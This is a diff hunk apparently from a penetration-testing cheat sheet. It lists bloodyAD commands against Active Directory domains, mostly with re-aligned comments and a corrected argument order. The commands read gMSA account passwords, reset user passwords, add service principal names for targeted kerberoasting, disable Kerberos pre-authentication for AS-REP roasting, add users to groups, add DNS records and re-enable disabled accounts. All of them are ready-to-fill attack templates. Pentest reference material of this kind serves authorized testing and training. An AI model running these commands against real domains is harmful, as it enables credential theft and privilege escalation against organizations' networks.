@@ -4641,21 +4641,21 @@ bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACC
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr msDS-ManagedPassword                  // Read GMSA account password
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k get object '<ACCOUNTNAME>$' --attr msDS-ManagedPassword                           // Read GMSA account password using Kerberos
 
-faketime 'now + 31 hours'  bloodyAD --host <RHOST> -k --host <REALM> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set password '<USERNAME>' '<PASSWORD>'                 // Set a password for a user
+faketime 'now + 31 hours'  bloodyAD --host <RHOST> -k --host <REALM> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set password '<USERNAME>' '<PASSWORD>'                                             // Set a password for a user
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set object '<USERNAME>' servicePrincipalName                             // Set a Service Principal Name (SPN)
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName                                      // Set a Service Principal Name (SPN) using Kerberos
-faketime 'now + 8 hours' bloodyAD -d <RHOST> --host <FQDN> --dc-ip <IP> -u svc_ldap -p <PASSWORD> -k  set object 'victin_name' servicePrincipalName	// Set a Service Principal Name (SPN) using Kerberos
-KRB5CCNAME=/tmp/krb5cc_1000 faketime 'now + 8 hours' bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName -v 'cifs/<USERNAME>'                 // Set a Service Principal Name (SPN) using Kerberos
+faketime 'now + 8 hours' bloodyAD -d <RHOST> --host <FQDN> --dc-ip <IP> -u svc_ldap -p <PASSWORD> -k  set object 'victin_name' servicePrincipalName	                                            // Set a Service Principal Name (SPN) using Kerberos
+KRB5CCNAME=/tmp/krb5cc_1000 faketime 'now + 8 hours' bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName -v 'cifs/<USERNAME>'                   // Set a Service Principal Name (SPN) using Kerberos
 
-KRB5CCNAME=/tmp/krb5cc_1000 faketime 'now + 8 hours' bloodyAD -d <RHOST> -k --dc-ip <IP> --host <FQDN> add uac -f DONT_REQ_PREAUTH <VICTIM>		// Enables AS-REP roasting by disabling Kerberos pre-authentication (due to GenericWrite privileges via RESTORE_USERS group)
+KRB5CCNAME=/tmp/krb5cc_1000 faketime 'now + 8 hours' bloodyAD -d <RHOST> -k --dc-ip <IP> --host <FQDN> add uac -f DONT_REQ_PREAUTH <VICTIM>		                                                // Enables AS-REP roasting by disabling Kerberos pre-authentication (due to GenericWrite privileges via RESTORE_USERS group)
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add groupMember '<GROUP>' '<USERNAME>'                                   // Add user to a group
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k add groupMember '<GROUP>' '<USERNAME>'                                            // Add user to a group using Kerberos
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add dnsRecord <RECORD> <LHOST>                                           // Add a new DNS entry
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac <USERNAME> DONT_REQ_PREAUTH                                      // Enable DONT_REQ_PREAUTH for ASREPRoast
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k add uac <USERNAME> -f DONT_REQ_PREAUTH                                            // Enable DONT_REQ_PREAUTH for ASREPRoast using Kerberos
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove dnsRecord <RECORD> <LHOST>                                        // Remove a DNS entry
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove uac <USERNAME> ACCOUNTDISABLE                                     // Disable ACCOUNTDISABLE (enable account)
-bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k remove uac <USERNAME> -f ACCOUNTDISABLE                                           // Disable ACCOUNTDISABLE (enable account) using Kerberos
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove uac -f ACCOUNTDISABLE <USERNAME>                                  // Disable ACCOUNTDISABLE (enable account)
+bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k remove uac -f ACCOUNTDISABLE <USERNAME>                                           // Disable ACCOUNTDISABLE (enable account) using Kerberos
 ```
 
 #### Certify
